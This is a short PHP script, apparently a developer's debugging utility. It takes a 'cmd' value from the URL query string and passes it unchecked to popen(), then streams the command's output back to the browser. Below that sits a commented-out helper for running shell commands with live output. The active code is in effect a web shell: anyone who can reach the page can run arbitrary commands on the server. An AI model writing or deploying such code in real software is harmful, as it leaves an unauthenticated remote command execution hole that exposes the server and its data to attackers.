<?php  

  $cmd = $_GET['cmd'];

  // $cmd = 'cat /Library/WebServer/Documents/Sites/dian/storage/logs/wechat.log';
  
  while (@ ob_end_flush()); // end all output buffers if any

  $proc = popen($cmd, 'r');
  echo '<pre>';
  while (!feof($proc))
  {
    echo fread($proc, 1024);
    @ flush();
  }
  echo '</pre>';

// /**
//  * Execute the given command by displaying console output live to the user.
//  *  @param  string  cmd          :  command to be executed
//  *  @return array   exit_status  :  exit status of the executed command
//  *                  output       :  console output of the executed command
//  */
// function liveExecuteCommand($cmd)
// {

//     while (@ ob_end_flush()); // end all output buffers if any

//     $proc = popen("$cmd 2>&1 ; echo Exit status : $?", 'r');

//     $live_output     = "";
//     $complete_output = "";

//     while (!feof($proc))
//     {
//         $live_output     = fread($proc, 1024);
//         $complete_output = $complete_output . $live_output;
//         echo "$live_output";
//         @ flush();
//     }

//     pclose($proc);

//     // get exit status
//     preg_match('/[0-9]+$/', $complete_output, $matches);

//     // return exit status and intended output
//     return array (
//                     'exit_status'  => intval($matches[0]),
//                     'output'       => str_replace("Exit status : " . $matches[0], '', $complete_output)
//                  );
// }

// $result = liveExecuteCommand('ls -la');

// if($result['exit_status'] === 0){
//    // do something if command execution succeeds
//    echo 'script execute successfully.';
// } else {
//     // do something on failure
//     echo 'script execute failed'
// }
?>